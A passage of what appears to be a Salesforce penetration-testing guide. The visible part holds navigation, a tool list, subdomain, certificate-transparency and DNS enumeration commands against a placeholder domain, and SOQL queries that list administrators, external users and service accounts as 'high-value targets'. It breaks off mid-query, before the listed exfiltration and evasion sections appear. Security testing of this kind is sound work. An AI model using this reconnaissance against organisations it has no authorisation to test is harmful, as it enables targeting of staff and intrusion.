          <li class="md-nav__item">
  <a href="#2-api-security-configuration" class="md-nav__link">
    <span class="md-ellipsis">
      2. API Security Configuration
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3-data-loss-prevention-assessment" class="md-nav__link">
    <span class="md-ellipsis">
      3. Data Loss Prevention Assessment
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#api-security-testing" class="md-nav__link">
    <span class="md-ellipsis">
      API Security Testing
    </span>
  </a>
  
    <nav class="md-nav" aria-label="API Security Testing">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-rest-api-security-assessment" class="md-nav__link">
    <span class="md-ellipsis">
      1. REST API Security Assessment
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-bulk-api-security-assessment" class="md-nav__link">
    <span class="md-ellipsis">
      2. Bulk API Security Assessment
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3-soap-api-security-testing" class="md-nav__link">
    <span class="md-ellipsis">
      3. SOAP API Security Testing
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#integration-security-assessment" class="md-nav__link">
    <span class="md-ellipsis">
      Integration Security Assessment
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Integration Security Assessment">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-connected-apps-security-review" class="md-nav__link">
    <span class="md-ellipsis">
      1. Connected Apps Security Review
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-named-credentials-security-assessment" class="md-nav__link">
    <span class="md-ellipsis">
      2. Named Credentials Security Assessment
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#advanced-attack-vectors" class="md-nav__link">
    <span class="md-ellipsis">
      Advanced Attack Vectors
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Advanced Attack Vectors">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-formula-injection-attacks" class="md-nav__link">
    <span class="md-ellipsis">
      1. Formula Injection Attacks
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-process-automation-exploitation" class="md-nav__link">
    <span class="md-ellipsis">
      2. Process Automation Exploitation
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3-metadata-api-security-exploitation" class="md-nav__link">
    <span class="md-ellipsis">
      3. Metadata API Security Exploitation
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#post-exploitation-persistence" class="md-nav__link">
    <span class="md-ellipsis">
      Post-Exploitation &amp; Persistence
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Post-Exploitation &amp; Persistence">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-data-exfiltration-techniques" class="md-nav__link">
    <span class="md-ellipsis">
      1. Data Exfiltration Techniques
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-persistence-mechanisms" class="md-nav__link">
    <span class="md-ellipsis">
      2. Persistence Mechanisms
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3-lateral-movement" class="md-nav__link">
    <span class="md-ellipsis">
      3. Lateral Movement
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#detection-evasion" class="md-nav__link">
    <span class="md-ellipsis">
      Detection Evasion
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Detection Evasion">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-audit-trail-manipulation" class="md-nav__link">
    <span class="md-ellipsis">
      1. Audit Trail Manipulation
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-legitimate-tool-abuse" class="md-nav__link">
    <span class="md-ellipsis">
      2. Legitimate Tool Abuse
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#reporting-evidence-collection" class="md-nav__link">
    <span class="md-ellipsis">
      Reporting &amp; Evidence Collection
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Reporting &amp; Evidence Collection">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-critical-findings-documentation" class="md-nav__link">
    <span class="md-ellipsis">
      1. Critical Findings Documentation
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-compliance-mapping" class="md-nav__link">
    <span class="md-ellipsis">
      2. Compliance Mapping
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3-risk-assessment-matrix" class="md-nav__link">
    <span class="md-ellipsis">
      3. Risk Assessment Matrix
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#remediation-hardening-recommendations" class="md-nav__link">
    <span class="md-ellipsis">
      Remediation &amp; Hardening Recommendations
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Remediation &amp; Hardening Recommendations">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#1-immediate-security-controls" class="md-nav__link">
    <span class="md-ellipsis">
      1. Immediate Security Controls
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#2-short-term-security-improvements-1-2-weeks" class="md-nav__link">
    <span class="md-ellipsis">
      2. Short-Term Security Improvements (1-2 weeks)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#3-long-term-security-strategy-1-3-months" class="md-nav__link">
    <span class="md-ellipsis">
      3. Long-Term Security Strategy (1-3 months)
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#conclusion" class="md-nav__link">
    <span class="md-ellipsis">
      Conclusion
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  


  
  


  <h1>Salesforce   1</h1>

<hr />
<h2 id="table-of-contents">Table of Contents</h2>
<ol>
<li><a href="#pre-engagement-setup">Pre-Engagement Setup</a></li>
<li><a href="#reconnaissance--intelligence-gathering">Reconnaissance &amp; Intelligence Gathering</a></li>
<li><a href="#authentication-security-assessment">Authentication Security Assessment</a></li>
<li><a href="#authorization--access-control-testing">Authorization &amp; Access Control Testing</a></li>
<li><a href="#data-security-evaluation">Data Security Evaluation</a></li>
<li><a href="#custom-code-security-analysis">Custom Code Security Analysis</a></li>
<li><a href="#platform-configuration-security">Platform Configuration Security</a></li>
<li><a href="#api-security-testing">API Security Testing</a></li>
<li><a href="#integration-security-assessment">Integration Security Assessment</a></li>
<li><a href="#advanced-attack-vectors">Advanced Attack Vectors</a></li>
<li><a href="#post-exploitation--persistence">Post-Exploitation &amp; Persistence</a></li>
<li><a href="#detection-evasion">Detection Evasion</a></li>
<li><a href="#reporting--evidence-collection">Reporting &amp; Evidence Collection</a></li>
</ol>
<hr />
<h2 id="pre-engagement-setup">Pre-Engagement Setup</h2>
<h3 id="essential-tools">Essential Tools</h3>
<ul>
<li><strong>Salesforce CLI (sfdx)</strong>: Metadata manipulation and org access</li>
<li><strong>Burp Suite Professional</strong>: API interception and manipulation</li>
<li><strong>Salesforce Inspector</strong>: Browser extension for metadata exploration</li>
<li><strong>Postman</strong>: API testing and automation</li>
<li><strong>PMD with Apex Rules</strong>: Static code analysis</li>
<li><strong>simple_salesforce (Python)</strong>: Automated API testing</li>
</ul>
<h3 id="initial-access-validation">Initial Access Validation</h3>
<div class="language-sql highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="c1">-- Verify current user context</span>
</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Username</span><span class="p">,</span><span class="w"> </span><span class="n">Profile</span><span class="p">.</span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">UserRole</span><span class="p">.</span><span class="n">Name</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="w">       </span><span class="n">Profile</span><span class="p">.</span><span class="n">PermissionsModifyAllData</span><span class="p">,</span><span class="w"> </span><span class="n">Profile</span><span class="p">.</span><span class="n">PermissionsViewAllData</span>
</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="k">FROM</span><span class="w"> </span><span class="k">User</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">Id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">:</span><span class="n">UserInfo</span><span class="p">.</span><span class="n">getUserId</span><span class="p">()</span>
</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>
</span><span id="__span-0-6"><a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a><span class="c1">-- Check organization details</span>
</span><span id="__span-0-7"><a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">OrganizationType</span><span class="p">,</span><span class="w"> </span><span class="n">InstanceName</span><span class="p">,</span><span class="w"> </span><span class="n">IsSandbox</span><span class="p">,</span><span class="w"> </span><span class="n">Edition</span>
</span><span id="__span-0-8"><a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a><span class="k">FROM</span><span class="w"> </span><span class="n">Organization</span>
</span></code></pre></div>
<hr />
<h2 id="reconnaissance-intelligence-gathering">Reconnaissance &amp; Intelligence Gathering</h2>
<h3 id="1-salesforce-instance-discovery">1. Salesforce Instance Discovery</h3>
<p><strong>Objective</strong>: Identify all Salesforce instances and public attack surfaces.</p>
<p><strong>Methods</strong>:
<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c1"># Subdomain enumeration</span>
</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>subfinder<span class="w"> </span>-d<span class="w"> </span>target.com<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s2">&quot;(salesforce|force|lightning|my\.salesforce)&quot;</span>
</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>amass<span class="w"> </span>enum<span class="w"> </span>-passive<span class="w"> </span>-d<span class="w"> </span>target.com<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s2">&quot;(salesforce|force|lightning)&quot;</span>
</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>
</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="c1"># Certificate transparency analysis</span>
</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>curl<span class="w"> </span>-s<span class="w"> </span><span class="s2">&quot;https://crt.sh/?q=%.target.com&amp;output=json&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>jq<span class="w"> </span>-r<span class="w"> </span><span class="s1">&#39;.[].name_value&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s2">&quot;(salesforce|force|lightning)&quot;</span>
</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>
</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="c1"># DNS enumeration</span>
</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>dig<span class="w"> </span>TXT<span class="w"> </span>target.com<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span>salesforce
</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a>dig<span class="w"> </span>CNAME<span class="w"> </span>www.target.com<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span>salesforce
</span></code></pre></div></p>
<p><strong>Impact</strong>: Reveals additional attack surfaces and potential shadow IT implementations.</p>
<h3 id="2-organization-metadata-enumeration">2. Organization Metadata Enumeration</h3>
<p><strong>Objective</strong>: Gather critical organizational information and identify edition-specific features.</p>
<p><strong>SOQL Queries</strong>:
<div class="language-sql highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1">-- Comprehensive org information</span>
</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">OrganizationType</span><span class="p">,</span><span class="w"> </span><span class="n">InstanceName</span><span class="p">,</span><span class="w"> </span><span class="n">IsSandbox</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a><span class="w">       </span><span class="n">LanguageLocaleKey</span><span class="p">,</span><span class="w"> </span><span class="n">DefaultLocaleSidKey</span><span class="p">,</span><span class="w"> </span><span class="n">TimeZoneSidKey</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a><span class="w">       </span><span class="n">CreatedDate</span><span class="p">,</span><span class="w"> </span><span class="n">Edition</span><span class="p">,</span><span class="w"> </span><span class="n">TrialExpirationDate</span>
</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="k">FROM</span><span class="w"> </span><span class="n">Organization</span>
</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>
</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a><span class="c1">-- Feature availability detection</span>
</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">FeatureType</span><span class="p">,</span><span class="w"> </span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">ParentId</span><span class="w"> </span>
</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a><span class="k">FROM</span><span class="w"> </span><span class="n">Feature</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">IsEnabled</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">true</span>
</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>
</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a><span class="c1">-- License information</span>
</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">Status</span><span class="p">,</span><span class="w"> </span><span class="n">UsedLicenses</span><span class="p">,</span><span class="w"> </span><span class="n">TotalLicenses</span><span class="p">,</span><span class="w"> </span><span class="n">LicenseDefinitionKey</span>
</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a><span class="k">FROM</span><span class="w"> </span><span class="n">UserLicense</span>
</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a>
</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a><span class="c1">-- API version capabilities</span>
</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">VersionNumber</span><span class="p">,</span><span class="w"> </span><span class="n">Status</span><span class="p">,</span><span class="w"> </span><span class="n">ReleaseDate</span>
</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a><span class="k">FROM</span><span class="w"> </span><span class="n">ApiVersion</span><span class="w"> </span><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">VersionNumber</span><span class="w"> </span><span class="k">DESC</span>
</span></code></pre></div></p>
<p><strong>Impact</strong>: Understanding platform capabilities and limitations for targeted attack planning.</p>
<h3 id="3-user-role-intelligence">3. User &amp; Role Intelligence</h3>
<p><strong>Objective</strong>: Map organizational hierarchy and identify high-value targets.</p>
<p><strong>SOQL Queries</strong>:
<div class="language-sql highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="c1">-- Comprehensive user enumeration</span>
</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Username</span><span class="p">,</span><span class="w"> </span><span class="n">Email</span><span class="p">,</span><span class="w"> </span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">Title</span><span class="p">,</span><span class="w"> </span><span class="n">Department</span><span class="p">,</span><span class="w"> </span><span class="n">Division</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="w">       </span><span class="n">IsActive</span><span class="p">,</span><span class="w"> </span><span class="n">LastLoginDate</span><span class="p">,</span><span class="w"> </span><span class="n">LastPasswordChangeDate</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="w">       </span><span class="n">Profile</span><span class="p">.</span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">UserRole</span><span class="p">.</span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">UserType</span><span class="p">,</span><span class="w"> </span><span class="n">CreatedDate</span><span class="p">,</span>
</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="w">       </span><span class="n">NumberOfFailedLogins</span><span class="p">,</span><span class="w"> </span><span class="n">PasswordNeverExpires</span>
</span><span id="__span-3-6"><a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a><span class="k">FROM</span><span class="w"> </span><span class="k">User</span><span class="w"> </span>
</span><span id="__span-3-7"><a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">LastLoginDate</span><span class="w"> </span><span class="k">DESC</span><span class="w"> </span><span class="n">NULLS</span><span class="w"> </span><span class="k">LAST</span>
</span><span id="__span-3-8"><a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>
</span><span id="__span-3-9"><a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a><span class="c1">-- Administrative user identification</span>
</span><span id="__span-3-10"><a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Username</span><span class="p">,</span><span class="w"> </span><span class="n">Email</span><span class="p">,</span><span class="w"> </span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">Profile</span><span class="p">.</span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">UserRole</span><span class="p">.</span><span class="n">Name</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-3-11"><a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a><span class="w">       </span><span class="n">LastLoginDate</span><span class="p">,</span><span class="w"> </span><span class="n">IsActive</span><span class="p">,</span><span class="w"> </span><span class="n">CreatedDate</span>
</span><span id="__span-3-12"><a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a><span class="k">FROM</span><span class="w"> </span><span class="k">User</span><span class="w"> </span>
</span><span id="__span-3-13"><a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">Profile</span><span class="p">.</span><span class="n">Name</span><span class="w"> </span><span class="k">IN</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;System Administrator&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;System Administrator Light&#39;</span><span class="p">)</span><span class="w"> </span>
</span><span id="__span-3-14"><a id="__codelineno-3-14" name="__codelineno-3-14" href="#__codelineno-3-14"></a><span class="w">   </span><span class="k">OR</span><span class="w"> </span><span class="n">Profile</span><span class="p">.</span><span class="n">PermissionsModifyAllData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">true</span><span class="w"> </span>
</span><span id="__span-3-15"><a id="__codelineno-3-15" name="__codelineno-3-15" href="#__codelineno-3-15"></a><span class="w">   </span><span class="k">OR</span><span class="w"> </span><span class="n">Profile</span><span class="p">.</span><span class="n">PermissionsViewAllData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">true</span>
</span><span id="__span-3-16"><a id="__codelineno-3-16" name="__codelineno-3-16" href="#__codelineno-3-16"></a>
</span><span id="__span-3-17"><a id="__codelineno-3-17" name="__codelineno-3-17" href="#__codelineno-3-17"></a><span class="c1">-- External and partner users</span>
</span><span id="__span-3-18"><a id="__codelineno-3-18" name="__codelineno-3-18" href="#__codelineno-3-18"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Username</span><span class="p">,</span><span class="w"> </span><span class="n">Email</span><span class="p">,</span><span class="w"> </span><span class="n">UserType</span><span class="p">,</span><span class="w"> </span><span class="n">ContactId</span><span class="p">,</span><span class="w"> </span><span class="n">AccountId</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-3-19"><a id="__codelineno-3-19" name="__codelineno-3-19" href="#__codelineno-3-19"></a><span class="w">       </span><span class="n">IsActive</span><span class="p">,</span><span class="w"> </span><span class="n">LastLoginDate</span><span class="p">,</span><span class="w"> </span><span class="n">CreatedDate</span>
</span><span id="__span-3-20"><a id="__codelineno-3-20" name="__codelineno-3-20" href="#__codelineno-3-20"></a><span class="k">FROM</span><span class="w"> </span><span class="k">User</span><span class="w"> </span>
</span><span id="__span-3-21"><a id="__codelineno-3-21" name="__codelineno-3-21" href="#__codelineno-3-21"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">UserType</span><span class="w"> </span><span class="k">IN</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;PowerPartner&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;PowerCustomerSuccess&#39;</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-3-22"><a id="__codelineno-3-22" name="__codelineno-3-22" href="#__codelineno-3-22"></a><span class="w">                  </span><span class="s1">&#39;CustomerSuccess&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Partner&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;Guest&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;CspLitePortal&#39;</span><span class="p">)</span>
</span><span id="__span-3-23"><a id="__codelineno-3-23" name="__codelineno-3-23" href="#__codelineno-3-23"></a>
</span><span id="__span-3-24"><a id="__codelineno-3-24" name="__codelineno-3-24" href="#__codelineno-3-24"></a><span class="c1">-- Recently created users (potential backdoors)</span>
</span><span id="__span-3-25"><a id="__codelineno-3-25" name="__codelineno-3-25" href="#__codelineno-3-25"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Username</span><span class="p">,</span><span class="w"> </span><span class="n">Email</span><span class="p">,</span><span class="w"> </span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">CreatedDate</span><span class="p">,</span><span class="w"> </span><span class="n">CreatedBy</span><span class="p">.</span><span class="n">Name</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-3-26"><a id="__codelineno-3-26" name="__codelineno-3-26" href="#__codelineno-3-26"></a><span class="w">       </span><span class="n">IsActive</span><span class="p">,</span><span class="w"> </span><span class="n">LastLoginDate</span>
</span><span id="__span-3-27"><a id="__codelineno-3-27" name="__codelineno-3-27" href="#__codelineno-3-27"></a><span class="k">FROM</span><span class="w"> </span><span class="k">User</span><span class="w"> </span>
</span><span id="__span-3-28"><a id="__codelineno-3-28" name="__codelineno-3-28" href="#__codelineno-3-28"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">CreatedDate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LAST_N_DAYS</span><span class="p">:</span><span class="mi">30</span><span class="w"> </span>
</span><span id="__span-3-29"><a id="__codelineno-3-29" name="__codelineno-3-29" href="#__codelineno-3-29"></a><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">CreatedDate</span><span class="w"> </span><span class="k">DESC</span>
</span><span id="__span-3-30"><a id="__codelineno-3-30" name="__codelineno-3-30" href="#__codelineno-3-30"></a>
</span><span id="__span-3-31"><a id="__codelineno-3-31" name="__codelineno-3-31" href="#__codelineno-3-31"></a><span class="c1">-- Service accounts identification</span>
</span><span id="__span-3-32"><a id="__codelineno-3-32" name="__codelineno-3-32" href="#__codelineno-3-32"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">Username</span><span class="p">,</span><span class="w"> </span><span class="n">Email</span><span class="p">,</span><span class="w"> </span><span class="n">Name</span><span class="p">,</span><span class="w"> </span><span class="n">IsActive</span><span class="p">,</span><span class="w"> </span><span class="n">LastLoginDate</span><span class="p">,</span><span class="w"> </span><span class="n">CreatedDate</span>
</span><span id="__span-3-33"><a id="__codelineno-3-33" name="__codelineno-3-33" href="#__codelineno-3-33"></a><span class="k">FROM</span><span class="w"> </span><span class="k">User</span><span class="w"> </span>
</span><span id="__span-3-34"><a id="__codelineno-3-34" name="__codelineno-3-34" href="#__codelineno-3-34"></a><span class="k">WHERE</span><span class="w"> </span><span class="p">(</span><span class="n">Name</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%service%&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="n">Name</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%integration%&#39;</span><span class="w"> </span>
</span><span id="__span-3-35"><a id="__codelineno-3-35" name="__codelineno-3-35" href="#__codelineno-3-35"></a><span class="w">    </span><span class="k">OR</span><span class="w"> </span><span class="n">Name</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%api%&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="n">Username</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%service%&#39;</span><span class="w"> </span>
</span><span id="__span-3-36"><a id="__codelineno-3-36" name="__codelineno-3-36" href="#__codelineno-3-36"></a><span class="w">    </span><span class="k">OR</span><span class="w"> </span><span class="n">Username</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%integration%&#39;</span><span class="w"> </span><span class="k">OR</span><span class="w"> </span><span class="n">Username</span><span class="w"> </span><span class="k">LIKE</span><span class="w"> </span><span class="s1">&#39;%api%&#39;</span><span class="p">)</span>
</span></code></pre></div></p>
<p><strong>Impact</strong>: Identifies high-value targets for social engineering and credential attacks.</p>
<h3 id="4-custom-code-object-discovery">4. Custom Code &amp; Object Discovery</h3>
<p><strong>Objective</strong>: Enumerate custom attack surface including Apex, Visualforce, and Lightning components.</p>
<p><strong>SOQL Queries</strong>:
<div class="language-sql highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1">-- Custom objects</span>
</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">QualifiedApiName</span><span class="p">,</span><span class="w"> </span><span class="n">Label</span><span class="p">,</span><span class="w"> </span><span class="n">PluralLabel</span><span class="p">,</span><span class="w"> </span><span class="n">IsCustomizable</span><span class="p">,</span><span class="w"> </span>
</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="w">       </span><span class="n">KeyPrefix</span><span class="p">,</span><span class="w"> </span><span class="n">RecordTypesSupported</span>
